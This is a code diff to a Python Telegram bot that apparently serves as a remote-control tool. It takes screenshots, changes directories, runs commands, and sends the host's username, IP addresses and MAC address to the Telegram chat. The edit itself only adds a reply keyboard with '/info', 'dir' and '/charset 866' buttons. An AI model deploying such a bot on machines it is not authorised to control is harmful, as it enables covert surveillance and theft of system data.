@@ -2,6 +2,7 @@ import os
 import mss
 import subprocess
 import telebot
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 import requests
 from telebot import types
 from io import StringIO
@@ -83,9 +84,17 @@ def screenshot(message):
 def info(message):
     bot.send_message(message.chat.id, f"{util.username()}@{util.device()}({util.platform()}-x{util.architecture()}) {util.local_ip()} / {util.public_ip()} / {util.mac_address()}")
 
-@bot.message_handler(commands=["keys"])
+@bot.message_handler(commands=["start"])
 def keys(message):
-    bot.send_message(message.chat.id, f"keys", reply_markup={"reply_keyboard_markup":[[{"text":"KEY TEST"}]]})
+    keyboard=ReplyKeyboardMarkup(True,False)
+    keyboard.add(
+	KeyboardButton("/info"),
+        KeyboardButton("dir"),
+    )
+    keyboard.add(
+	KeyboardButton("/charset 866"),
+   )
+    bot.send_message(message.chat.id, f"keys", reply_markup=keyboard)
 
 @bot.message_handler(commands=["cd"])
 def cd(message):
